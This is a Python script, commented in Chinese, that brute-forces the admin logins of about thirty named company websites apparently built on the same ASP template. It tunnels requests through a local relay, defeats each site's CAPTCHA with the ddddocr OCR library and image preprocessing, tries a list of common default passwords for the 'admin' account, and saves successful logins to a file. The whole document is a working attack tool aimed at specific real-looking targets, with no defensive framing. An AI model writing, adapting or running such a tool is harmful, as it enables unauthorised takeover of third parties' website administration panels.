#!/usr/bin/env python3
"""asp_batch_bf2.py - 批量爆破同模板ASP后台(通用跳板工具链)
getcap2.php?d=域名 -> 165 OCR -> loginpost2.php?d=域名&p=密码&c=验证码
"""
import urllib.request, urllib.parse, ssl, re, sys, time, io
import ddddocr
from PIL import Image

ctx = ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
UA = {'User-Agent': 'Mozilla/5.0'}
GETCAP = 'http://127.0.0.1:13080/getcap2.php'
CAPIMG = 'http://127.0.0.1:13080/ys_cap2.jpg'
LOGIN = 'http://127.0.0.1:13080/loginpost2.php'

PASSWORDS = ["admin", "admin123", "123456", "admin888", "12345678", "password",
             "admin@123", "admin1234", "123456a", "a123456", "666666", "888888",
             "000000", "qwer1234", "abc123", "admin666", "123123", "111111"]

DOMAINS = ['www.aqsgpack.com', 'www.czdisar.com', 'www.east-tool.com',
           'www.hdhhg.com', 'www.jfjmjx.cn', 'www.marazziguide.com',
           'www.ntyq.cn', 'www.qbydby.com', 'www.qjsgf.com', 'www.xfscl.com',
           'www.xingyich.com.cn', 'www.xngl.com', 'www.yczhende.com',
           'www.zj-syfj.com', 'xwrubber.cn', 'xidipipe.com', 'webtex.cn',
           'szsadwj.com', 'wdzcz.com', 'lsks.org.cn', 'lspipesolutions.com',
           'skf-afl.com', 'smt66.com', 'huxhardware.com', 'aierpaike.com',
           'ecoair.cn', 'hbhmjc.com', 'sh-pump.com', 'puwall.cn', 'gdcq119.com']

def fetch(url, timeout=20):
    try:
        r = urllib.request.urlopen(urllib.request.Request(url, headers=UA), timeout=timeout, context=ctx)
        return r.read(30000).decode('utf-8', 'ignore')
    except Exception as e:
        return 'ERR:' + repr(e)[:60]

def get_cap(dom):
    out = fetch(GETCAP + '?d=' + urllib.parse.quote(dom))
    if 'SAVED:' not in out:
        return None
    try:
        r = urllib.request.urlopen(urllib.request.Request(CAPIMG, headers=UA), timeout=15, context=ctx)
        return r.read()
    except Exception:
        return None

def do_login(dom, pw, code):
    return fetch(LOGIN + '?d=' + urllib.parse.quote(dom) + '&p=' + urllib.parse.quote(pw) + '&c=' + code)

def main():
    ocr = ddddocr.DdddOcr(show_ad=False)
    ocrb = ddddocr.DdddOcr(show_ad=False, beta=True)
    hits = []
    for dom in DOMAINS:
        print('=== %s ===' % dom, flush=True)
        ok = False
        for pw in PASSWORDS:
            for attempt in range(6):
                img = get_cap(dom)
                if not img or len(img) < 50:
                    print('  cap fail %s' % pw, flush=True)
                    time.sleep(3)
                    continue
                try:
                    c1 = ocr.classification(img)
                except Exception:
                    print('  cap not image %s' % pw, flush=True)
                    break
                try:
                    im = Image.open(io.BytesIO(img)).convert('L')
                    im = im.resize((im.width * 4, im.height * 4), Image.LANCZOS)
                    im = im.point(lambda p: 255 if p > 120 else 0)
                    buf = io.BytesIO(); im.save(buf, 'PNG')
                    c2 = ocrb.classification(buf.getvalue())
                except Exception:
                    c2 = c1
                code = c1 if c1 == c2 else (c2 if len(c2) == 4 else c1)
                resp = do_login(dom, pw, code)
                if '验证码' in resp:
                    continue
                if '错误' in resp or '失败' in resp or '密码' in resp:
                    time.sleep(1)
                    break
                if '管理' in resp or '欢迎' in resp or 'logout' in resp.lower():
                    print('!!! HIT: %s admin/%s' % (dom, pw), flush=True)
                    hits.append((dom, 'admin', pw))
                    ok = True
                    break
                print('  CHECK %s: %s' % (pw, resp[:60].replace(chr(10), ' ')), flush=True)
            if ok:
                break
        if not ok:
            print('  %s: no hit' % dom, flush=True)
    print('=== DONE: %d hits ===' % len(hits), flush=True)
    for h in hits:
        print('HIT:', '\t'.join(h), flush=True)
    with open('/tmp/asp_batch_hits.txt', 'w') as f:
        for h in hits:
            f.write('\t'.join(h) + '\n')

if __name__ == '__main__':
    main()
